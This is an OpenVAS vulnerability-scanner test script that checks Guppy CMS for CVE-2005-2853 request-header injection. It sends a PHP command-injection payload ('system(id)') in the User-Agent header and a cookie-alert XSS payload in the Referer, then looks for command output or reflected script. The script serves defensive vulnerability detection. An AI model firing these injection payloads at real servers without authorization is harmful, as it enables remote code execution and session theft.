###############################################################################
# OpenVAS Vulnerability Test
# $Id: guppy_request_header_flaws.nasl 13679 2019-02-15 08:20:11Z cfischer $
#
# Guppy Request Header Injection Vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19943");
  script_version("$Revision: 13679 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2005-2853");
  script_bugtraq_id(14753);
  script_name("Guppy Request Header Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("(C) 2005 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.frsirt.com/english/advisories/2005/1639");

  script_tag(name:"solution", value:"Upgrade to Guppy version 4.5.4 or later.");
  script_tag(name:"summary", value:"The remote web server contains a PHP script that allows for
  arbitrary code execution and cross-site scripting attacks.

  Description :

  The remote host is running Guppy, a CMS written in PHP.

  The remote version of this software does not properly sanitize input
  to the Referer and User-Agent HTTP headers before using it in the
  'error.php' script.  A malicious user can exploit this flaw to inject
  arbitrary script and HTML code into a user's browser or, if PHP's
  'magic_quotes_gpc' setting is disabled, PHP code to be executed on the
  remote host subject to the privileges of the web server user id.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

# A simple alert.
xss = "<script>alert(document.cookie);</script>";

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

host = http_host_name( dont_add_port:TRUE );
has_xss = http_get_has_generic_xss( port:port, host:host );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  req = string( "GET ", dir, "/error.php?err=404 HTTP/1.1\r\n",
                "User-Agent: ", '"; system(id);#', "\r\n", # nb: try to execute id.
                "Referer: ", xss, "\r\n", # and try to inject some javascript.
                "Host: ", host, "\r\n", "\r\n" );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  # We need to follow the 302 redirection
  pat = "location: (.+)";
  matches = egrep( string:res, pattern:pat );
  if( matches ) {
    foreach match( split( matches ) ) {
      match = chomp( match );
      url = eregmatch( string:match, pattern:pat );
      if( isnull( url ) ) break;
      url = url[1];
      debug_print( "url[", url, "]\n" );
      break;
    }
  }

  if( url ) {

    req = http_get( item:dir + "/" + url, port:port );
    res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

    pat = "^(uid=[0-9]+.*gid=[0-9]+.*)";
    matches = egrep( string:res, pattern:pat );
    if( matches ) {
      foreach match( split( matches ) ) {
        match = chomp( match );
        idres = eregmatch( string:match, pattern:pat );
        if( isnull( idres ) ) break;
        idres = idres[1];
        debug_print( "idres[", idres, "]\n" );
        break;
      }
    }

    if( idres ) {
      report = string( "The following is the output received from the 'id' command:\n",
                       "\n", idres, "\n" );
      security_message( port:port, data:report );
      exit( 0 );
    } else if ( res =~ "^HTTP/1\.[01] 200" && xss >< res && ! has_xss ) { # Check for XSS.
      security_message( port:port );
      exit( 0 );
    }
  }
}

exit( 99 );
